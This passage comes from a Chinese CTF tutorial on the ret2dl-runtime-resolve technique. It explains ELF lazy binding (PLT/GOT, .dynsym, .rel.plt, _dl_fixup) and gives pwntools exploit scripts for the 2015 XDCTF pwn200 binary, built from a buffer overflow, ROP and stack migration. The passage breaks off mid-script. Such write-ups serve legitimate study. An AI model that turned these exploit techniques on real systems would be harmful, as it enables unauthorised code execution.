function)</code>这个函数的调用：先将所需要决议符号的下标压入栈，在将模块ID压入栈，然后调用动态链接器的<code>_dl_runtime_resolve()</code>函数来完成符号解析和重定位工作。**_dl_runtime_resolve()在进行一系列工作以后将func()的真正地址填入到func@GOT中**</li><li><strong>func()这个函数被解析完毕，再次调用func@plt时，第一条jmp指令就能够跳转到真正的func()函数中，func()函数返回的时候会根据栈里面保存的EIP直接返回到调用者，而不会在执行func@plt中第二条指令开始的那段代码，那段代码只会在符号未被解析时执行一次。</strong></li></ul></li></ul><p>ELF将GOT拆分两个表叫做<code>.got</code>和<code>.got.plt</code>。</p><ul><li><strong><code>.got</code>用来保存全局变量引用地址</strong>;</li><li><strong><code>.got.plt</code>用来保存函数引用地址，所有外部函数的引用全部分离出来放在<code>.got.plt</code>中。另外<code>.got.plt</code>还有特殊的地方就是它的前三项：</strong><ul><li>第一项是<code>.dynamic</code>段的地址，这个段描述了本模块动态链接相关的信息</li><li>第二项保存的是本模块的ID</li><li>第三项保存的是<code>_dl_runtime_resolve()</code>的地址</li></ul></li><li>其中第二项和第三项由动态链接器在装载共享模块的时候将他们初始化<code>.got.plt</code>的其余项分别对应每个外部函数的引用。PLT的结构为了减少代码的重复，ELF把上面例子中最后两条指令放到PLT中的第一项。并规定每一项的长度时16个字节，刚好存放3条指令，实际的PLT基本结构如下：</li></ul><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">PLT0:push *(GOT + 4)jump *(GOT + 8)...func@plt:jmp *(func@GOT)push njump PLT0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/19/ret2-dl-runtime-resolve/2.png"></p><h3 id="相关表"><a href="#相关表" class="headerlink" title="相关表"></a>相关表</h3><p><strong>.dynamic段：</strong><br><code>.dynamic</code>段里保存了动态链接器所需要的基本信息，比如依赖于哪些共享对象、动态链接符号表的位置、动态链接重定位表的位置、共享对象初始化代码地址等。<code>.dynamic</code>段结构数组如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token punctuation">{</span>  Elf32_Sword d_tag<span class="token punctuation">;</span>  <span class="token keyword">union</span> <span class="token punctuation">{</span>    Elf32_Word d_val<span class="token punctuation">;</span>    Elf32_Addr d_ptr<span class="token punctuation">;</span>  <span class="token punctuation">}</span> d_un<span class="token punctuation">;</span><span class="token punctuation">}</span> Elf32_Dyn<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Elf32_Dyn结构由一个类型值加上一个附加的数值或指针，对于不同的类型，后面附加的数值或者指针有着不同含义：</p><table><thead><tr><th align="center"><strong>d_tag类型</strong></th><th align="center"><strong>d_un的含义</strong></th></tr></thead><tbody><tr><td align="center">DT_SYMTAB</td><td align="center">动态链接符号表地址，d_ptr表示“.dynsym”的地址</td></tr><tr><td align="center">DT_STRTAB</td><td align="center">动态链接字符串表地址，d_ptr表示“.dynstr”的地址</td></tr><tr><td align="center">DT_STRSZ</td><td align="center">动态链接字符串表大小，d_val表示大小</td></tr><tr><td align="center">DT_REL、DT_RELA</td><td align="center">动态链接重定位表地址</td></tr><tr><td align="center">DT_RELENT、DT_RELAENT</td><td align="center">动态重读位表入口数量</td></tr></tbody></table><p>从上面给出的定义来看，<code>.dynamic</code>段里面保存的信息有点像ELF文件头，只是前面看到的ELF文件头中保存的是静态链接时相关的内容，比如静态链接时用到的符号表、重定位表，这里换成了动态链接下所使用的相关信息。所以“.dynamic”段可以堪称是动态链接下ELF文件的“文件头”</p><p>我们可以使用<code>readelf -d filename</code>查看文件的<code>.dynamic</code>段：</p><p>可以看到红色区域分别是<code>.dynstr</code>,<code>dynsym</code>,<code>.rel.plt</code>的基地址</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/20.png"></p><p><strong>动态符号表 – <code>.dynsym</code>：</strong><br>为了管理动态链接这些模块之间的符号导入导出关系，ELF有一个叫动态符号表（Dynamic Symbol Table）的段来保存这些信息，段名叫<code>.dynsym</code>。**<code>.dynsym</code>只保存与动态链接相关的符号，不保存模块内部符号，比如模块私有变量，而<code>.symtab</code>表包含所有符号，包括<code>.dynsym</code>中的符号**</p><p>动态符号表也需要一些辅助表，比如保存符号名的字符串表——动态符号字符串表<code>.dynstr</code>（Dynamic String Table）。由于动态链接下需要在程序运行时查找符号，为了加快符号的查找过程，还需要辅助的符号哈希表“.hash”</p><p><strong>动态链接重定位表：</strong><br>共享对象需要重定位的主要原因是导入符号的存在。动态链接下，无论是可执行文件或共享对象，一旦它依赖于其他共享对象，也就是说有导入的符号时，它的代码或数据中就会有对于导入符号的引用。在编译时这些导入符号的地址未知，在动态链接中，导入符号的地址在运行时才确定，所以需要在运行时将这些导入符号的引用修正，即需要重定位。</p><p>动态链接重定位相关结构：<br>动态链接的文件中，也有类似静态链接的重定位表，分别叫做<code>.rel.dyn</code>和<code>.rel.plt</code>，分别相当于静态链接下的<code>.rel.text</code>和<code>.rel.data</code>。</p><ul><li><code>.rel.dyn</code>实际上是对数据引用的修正，他所修正的位置位于<code>.got</code>以及数据段；</li><li><code>.rel.plt</code>是对函数引用的修正，他所修正的位置位于<code>.got.plt</code>。</li></ul><h2 id="动态调试理解-dl-runtime-resolve"><a href="#动态调试理解-dl-runtime-resolve" class="headerlink" title="动态调试理解_dl_runtime_resolve"></a>动态调试理解_dl_runtime_resolve</h2><p>1、我们把断点断在第一次调用<code>write@plt</code>的地方</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/3.png"></p><p>2、<code>si</code>跟进<code>wirte@plt</code>，这里有三个跳转</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/4.png"></p><p>3、我们看下第一个跳转会跳到哪里去，可以看到<code>0x804a01c</code>位置的值为<code>0x80483c6</code>，也就是下一条<code>push 0x20</code>指令的位置</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/5.png"></p><p>4、然后会把0x20压栈，然后跳到下一条指令<code>0x8048370</code>位置，把[0x804a004]的低32位压栈，然后跳到<code>_dl_runtime_resolve</code>位置</p><p>所以整体流程为：</p><ul><li>第一次跳转后会进入write函数自己的plt表项中；</li><li>第二次跳转会进入公共plt表项（plt0）中；</li><li>第三次跳转之后进入到了<code>_dl_runtime_resolve</code>；</li><li>函数当中三次跳转中间还穿插了两个push操作<ul><li>第一个push的0x20就是_dl_runtime_resolve函数的二参reloc_index；</li><li>第二个push的就是0x804a004就是函数的一参link_map_obj，参数从右向左进栈嘛。</li></ul></li></ul><h2 id="dl-runtime-resolve内部流程"><a href="#dl-runtime-resolve内部流程" class="headerlink" title="_dl_runtime_resolve内部流程"></a>_dl_runtime_resolve内部流程</h2><p>接下来就到了<code>_dl_runtime_resolve</code>函数内部的过程：</p><p><code>_dl_runtime_resolve</code>内部调用了<code>_dl_fixup</code>函数：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token function">_dl_fixup</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">link_map</span> <span class="token operator">*</span>l<span class="token punctuation">,</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Word<span class="token punctuation">)</span> reloc_arg<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// 首先通过参数reloc_arg计算重定位入口，这里的JMPREL即.rel.plt，reloc_offset即reloc_arg</span>    <span class="token keyword">const</span> PLTREL <span class="token operator">*</span><span class="token keyword">const</span> reloc <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">D_PTR</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> l_info<span class="token punctuation">[</span>DT_JMPREL<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> reloc_offset<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 然后通过reloc-&gt;r_info找到.dynsym中对应的条目</span>    <span class="token keyword">const</span> <span class="token function">ElfW</span><span class="token punctuation">(</span>Sym<span class="token punctuation">)</span> <span class="token operator">*</span>sym <span class="token operator">=</span> <span class="token operator">&amp;</span>symtab<span class="token punctuation">[</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_SYM<span class="token punctuation">)</span> <span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 这里还会检查reloc-&gt;r_info的最低位是不是R_386_JUMP_SLOT=7</span>    <span class="token function">assert</span> <span class="token punctuation">(</span><span class="token function">ELFW</span><span class="token punctuation">(</span>R_TYPE<span class="token punctuation">)</span><span class="token punctuation">(</span>reloc<span class="token operator">-&gt;</span>r_info<span class="token punctuation">)</span> <span class="token operator">==</span> ELF_MACHINE_JMP_SLOT<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 接着通过strtab+sym-&gt;st_name找到符号表字符串，result为libc基地址</span>    result <span class="token operator">=</span> <span class="token function">_dl_lookup_symbol_x</span> <span class="token punctuation">(</span>strtab <span class="token operator">+</span> sym<span class="token operator">-&gt;</span>st_name<span class="token punctuation">,</span> l<span class="token punctuation">,</span> <span class="token operator">&amp;</span>sym<span class="token punctuation">,</span> l<span class="token operator">-&gt;</span>l_scope<span class="token punctuation">,</span> version<span class="token punctuation">,</span> ELF_RTYPE_CLASS_PLT<span class="token punctuation">,</span> flags<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// value为libc基址加上要解析函数的偏移地址，也即实际地址</span>    value <span class="token operator">=</span> <span class="token function">DL_FIXUP_MAKE_VALUE</span> <span class="token punctuation">(</span>result<span class="token punctuation">,</span> sym <span class="token operator">?</span> <span class="token punctuation">(</span><span class="token function">LOOKUP_VALUE_ADDRESS</span> <span class="token punctuation">(</span>result<span class="token punctuation">)</span> <span class="token operator">+</span> sym<span class="token operator">-&gt;</span>st_value<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// 最后把value写入相应的GOT表条目中</span>    <span class="token keyword">return</span> <span class="token function">elf_machine_fixup_plt</span> <span class="token punctuation">(</span>l<span class="token punctuation">,</span> result<span class="token punctuation">,</span> reloc<span class="token punctuation">,</span> rel_addr<span class="token punctuation">,</span> value<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>分别来看这个函数的两个参数：<code>link_map_obj</code>，里面存放的是一段地址。<code>reloc_index</code>，里面存放的是重定位索引：</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/1.png"></p><ul><li>在一参<code>link_map_obj</code>中存放的其实是一段地址，这个地址就是<code>.dynamic段</code>的基地址</li><li>在<code>.dynamic</code>中可以在0x44偏移处找到<code>.dynstr</code>（动态字符串表）的基地址</li><li>在0x4c偏移处可以找到<code>.dynsym</code>（动态符号表）的基地址</li><li>在0x84偏移处可以找到<code>.rel.plt</code>（重定位表）的基地址</li><li><code>.rel.plt</code>（重定位表）的基地址加上二参<code>reloc_index</code>的重定位索引值（可以看做偏移）可以得到函数对应的<code>Elf32_Rel</code>结构体指针</li><li><code>Elf32_Rel</code>结构体中有两个成员变量：<code>r_offset</code>和<code>r_info</code>，将<code>r_info</code>右移8可以得到函数在<code>.dynsym</code>（符号表）中的下标</li><li><code>.dynsym</code>（符号表）的基地址加上函数在<code>.dynsym</code>的下标，可以得到函数名在<code>.dynstr</code>（字符串表）中的偏移<code>name_offset</code></li><li><code>.dynstr</code>（字符串表）的基地址加上<code>name_offset</code>就可以找到函数名了</li></ul><p>上述就是<code>_dl_runtime_resolve</code>的执行流程，也是在EXP中伪造篡改的过程。</p><blockquote><p>1、为什么<code>.rel.plt</code>（重定位表）加上二参<code>reloc_index</code>就能找到结构体指针？</p><p><code>.rel.plt</code>结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">&gt;</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">{</span> Elf32_Addr r_offset<span class="token punctuation">;</span> Elf32_Word r_info<span class="token punctuation">;</span><span class="token operator">&gt;</span><span class="token punctuation">}</span>Elf32_Rel<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>也就是说在<code>.rel.plt</code>中存放的内容都是以<code>[r_offset1,r_info1]、[r_offset2,r_info2]、[r_offset3,r_info3]…</code>这种形式存放的，<code>.rel.plt</code>中有多少个函数，就会有多少个这样的组合，可以使用命令<code>readelf -x .rel.plt main</code>查看<code>rel.plt</code>中的内容:</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/6.png"></p><p>可以看到都是以这种方式进行排列的，我们现在看到的其实是以小端序的方式排列的。拿第一个结构体举例，正常的显示方式应该是<code>r_offset：0x0804a00c，r_info：0x000001070</code></p><p>2、为什么要对<code>r_info</code>进行右移8的操作？</p><p>依然还是拿第一个结构体举例，<code>r_info</code>是0x00000107，<strong>107代表的是偏移为1的导入函数，07代表的是导入函数的意思，你可以把07看做成一个标志位，真正进行偏移运算的只有前面的1，所以需要对r_info进行右移8的操作将后面的标志位07去掉，保留前面需要计算的偏移</strong></p><p>3、下标和偏移一样吗？<br>下标和偏移本质来说一样，但是滑动的单位不一样。下标是以结构体为单位的，而偏移是以字节为单位的。所以前面<code>.dynsym</code>（符号表）的基地址加上函数在<code>.dynsym</code>的下标，实际上找的是在<code>.dynsym</code>中的第几个结构体</p></blockquote><h1 id="漏洞利用-–-32位开启Partial-RELRO"><a href="#漏洞利用-–-32位开启Partial-RELRO" class="headerlink" title="漏洞利用 – 32位开启Partial RELRO"></a>漏洞利用 – 32位开启Partial RELRO</h1><h2 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h2><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">dl_resolve 函数不会检查对应的符号是否越界，它只会根据我们所给定的数据来执行。dl_resolve 函数最后的解析根本上依赖于所给定的字符串。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h2><p>在知道<code>_dl_runtime_resolve</code>函数的执行流程之后，可以想一想，因为<code>_dl_runtime_resolve</code>的二参<code>reloc_index</code>就对应着要查找的函数如果可以控制相应的参数以及对应地址的内容就可以控制解析的函数，具体利用方式如下：</p><p>（1）控制程序执行<code>_dl_runtime_resolve</code>函数</p><ul><li>给定link_map和index两个参数</li><li>也可以直接给定plt0对应的汇编代码，此时只需要一个index就可以了，后面会用这种方法</li></ul><p>（2）控制index大小，便于指向自己控制的区域，从而伪造一个指定的重定位表项</p><p>（3）伪造重定位表项，使重定位表项所指的符号也在自己可以控制的范围内</p><p>（4）伪造符号内容，使符号对应的名称也在自己可以控制的范围内</p><h2 id="题解过程–32位-2015-xdctf-pwn200"><a href="#题解过程–32位-2015-xdctf-pwn200" class="headerlink" title="题解过程–32位 2015-xdctf-pwn200"></a>题解过程–32位 2015-xdctf-pwn200</h2><h3 id="stage1-–-栈迁移"><a href="#stage1-–-栈迁移" class="headerlink" title="stage1 – 栈迁移"></a>stage1 – 栈迁移</h3><p>这部分主要的目的是控制程序执行write函数，我们以输出“/bin/sh”字符串举例，输出/bin/sh是因为如果/bin/sh能够作为write函数的参数输出出来，那么就意味着同样可以作为system函数的参数执行。</p><p>虽然可以控制程序直接执行write函数。但是这里采用一个更加复杂的方法，使用栈迁移的技巧将栈迁移到bss段来控制write函数，主要分两步：<br>（1）将栈迁移到bss段<br>（2）控制write函数输出相应字符串</p><p>我们从bss+0x800的位置开始写入100个字节：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> elf<span class="token punctuation">.</span>libcbss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>read_bss_start <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">0x800</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span><span class="token comment">#填充buf</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token comment">#向read_bss_start读入100个字节</span><span class="token comment">#rop.read会自动完成read函数、函数参数、返回地址的栈部署</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read_bss_start<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token comment">#栈迁移</span><span class="token comment">#rop.migrate会利用leave_ret自动部署栈迁移</span>rop<span class="token punctuation">.</span>migrate<span class="token punctuation">(</span>read_bss_start<span class="token punctuation">)</span><span class="token comment">#print("rop.chain2:", rop.chain())</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"Welcome to XDCTF2015~!\n"</span><span class="token punctuation">,</span> rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>binsh <span class="token operator">=</span> <span class="token string">"/bin/sh;"</span><span class="token comment">#输出/bin/sh;字符串，我们把该字符串写在read_bss_start+80处</span><span class="token comment">#rop.write会自动完成write函数、函数参数、返回地址的栈部署</span>rop<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> read_bss_start <span class="token operator">+</span> <span class="token number">80</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">80</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>rop<span class="token punctuation">.</span>chain<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/04/19/ret2-dl-runtime-resolve/7.png"></p><h3 id="stage2-–-直接调用-dl-runtime-resolve"><a href="#stage2-–-直接调用-dl-runtime-resolve" class="headerlink" title="stage2 – 直接调用_dl_runtime_resolve"></a>stage2 – 直接调用<code>_dl_runtime_resolve</code></h3><h4 id="计算重定位索引"><a href="#计算重定位索引" class="headerlink" title="计算重定位索引"></a>计算重定位索引</h4><p>在第二部分就需要运用到前面原理部分的知识了，利用dlresolve相关知识来控制执行write函数。在STAGE1中我们直接调用了write函数来打印/bin/sh字符串，<strong>在STAGE2中主要利用plt[0]中的<code>push linkmap</code>以及跳转到dl_resolve函数中的解析指令来代替直接调用write函数的方式，其实我们需要在新栈中模拟的就是下面红色框的部分，对<code>.rel.plt</code>进行迁移</strong></p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/8.png"></p><p>那么我们在STAGE1的基础上还需要两点：</p><ul><li>plt[0]的地址</li><li>write函数的重定位索引</li></ul><p>用这两点来替代直接调用write函数，plt[0]可以通过pwntools直接获取，但是write函数的重定位索引就需要通过write_plt来计算了。<code>.plt</code>的每结构体占16个字节，可以使用命令<code>readelf -x .plt main</code>看一下程序的<code>.plt</code>结构：</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/9.png"></p><p><code>0x08048370</code>是plt[0]的位置，里面存放的是一段代码，虽然占用16个字节，但作为结构体的一部分，可以理解成一个头部。<code>.plt</code>的结构体下标是从1开始的，<code>.rel.plt</code>的结构体下标是从0开始的。所以<code>.plt</code>结构体对应的<code>.rel.plt</code>结构体形式如下：</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/10.png"></p><p>我们假设第五个是函数write的结构体，那么对应的write函数在<code>.rel.plt</code>中就是第四个结构体。也就是说可以通过公式<code>write_plt - plt[0]</code>可以得出，在<code>.plt</code>中write相对plt[0]的距离，那么这个距离中有多少个结构体呢，即write函数是<code>.plt中</code>的第几个结构体。<code>.plt</code>中每个结构体大小为16字节，那么通过公式（<code>(write_plt - plt[0]) // 16</code>就可以得出是第几个。由于<code>.plt</code>与<code>.rel.plt</code>结构体位置差1，所以可以通过公式<code>(write_plt - plt[0]) // 16 - 1</code>来得出write函数是<code>.rel.plt</code>中的第几个结构体</p><p>由于<code>.rel.plt</code>的每个结构体大小为8个字节，所以得出在<code>.rel.plt</code>的第几个结构体后还需要乘以8，计算出函数在<code>.rel.plt中</code>的重定位索引。所以完整公式为：<code>write_index = [(write_plt - plt[0]) // 16 - 1] * 8</code></p><blockquote><p>为什么在栈中部署<code>plt[0]</code>和<code>write_index</code>就可以达到调用write函数的作用？<br>这么布局其实是在模拟调用dl_runtime_resovle之前的过程，如果忘记了可以往前翻看一下。调用dl_runtime_resovle前的过程精简如下：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">&gt;call  write@plt&gt;jump  next addr&gt;push  reloc_arg(dl_runtime_resovle的1参，也就是write_index)&gt;jump --&gt; 公共plt表项（plt0）&gt;push  link_map&gt;jump --&gt; dl_runtime_resovle<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>那么我们在栈中的<code>plt0</code>和<code>write_index</code>就是跳过了call的过程，在模拟push reloc_arg和jump 公共plt表项这两个步骤，相当于我们直接来到下图中的<code>0x8048370</code>这个位置</p><p><img src="/2023/04/19/ret2-dl-runtime-resolve/4.png"></p><p>接下来程序会顺着往下执行<code>push link_map</code>,然后jmp到<code>_dl_runtime_resovle</code>函数，从而起到和直接调用write函数一样的作用。</p><p>在bss段中数据布局如下：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">   低地址位 <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span><span class="token operator">|</span>        plt0         <span class="token operator">|</span>  <span class="token operator">&lt;</span><span class="token operator">--</span><span class="token operator">--</span>ret<span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>    <span class="token operator">|</span>      write_index    <span class="token operator">|</span> write函数在<span class="token punctuation">.</span>rel<span class="token punctuation">.</span>plt的重定位索引    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>    <span class="token operator">|</span>         dead        <span class="token operator">|</span> write函数返回地址    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>    <span class="token operator">|</span>          <span class="token number">1</span>          <span class="token operator">|</span> write函数<span class="token number">1</span>参    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>    <span class="token operator">|</span>      <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>地址    <span class="token operator">|</span> write函数<span class="token number">2</span>参<span class="token punctuation">,</span><span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>字符串所在地址    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>                     <span class="token operator">|</span>          <span class="token number">7</span>          <span class="token operator">|</span> write函数<span class="token number">3</span>参         <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>                                  <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>  填充               <span class="token operator">|</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token operator">|</span>  填充              <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>  填充                <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>                    <span class="token operator">|</span>      <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>       <span class="token operator">|</span> <span class="token operator">/</span>bin<span class="token operator">/</span>sh<span class="token punctuation">;</span>字符串    <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token operator">+</span>     <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>    <span class="token operator">|</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>         <span class="token operator">|</span>                  <span class="token operator">|</span>        AAAA         <span class="token operator">|</span>              高地址位  <span class="token operator">+</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span><span class="token comment">#libc = elf.libc</span>bss <span class="token operator">=</span> elf<span class="token punctuation">.</span>bss<span class="token punctuation">(</span><span class="token punctuation">)</span>read_bss_start <span class="token operator">=</span> bss <span class="token operator">+</span> <span class="token number">0x800</span>rop <span class="token operator">=</span> ROP<span class="token punctuation">(</span><span class="token string">"./main_partial_relro_32"</span><span class="token punctuation">)</span><span class="token comment">#填充buf</span>rop<span class="token punctuation">.</span>raw<span class="token punctuation">(</span><span class="token string">'A'</span><span class="token operator">*</span><span class="token number">112</span><span class="token punctuation">)</span><span class="token comment">#向read_bss_start读入100个字节</span><span class="token comment">#rop.read会自动完成read函数、函数参数、返回地址的栈部署</span>rop<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> read_bss_start<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token comment">#栈迁移</span><span class="token 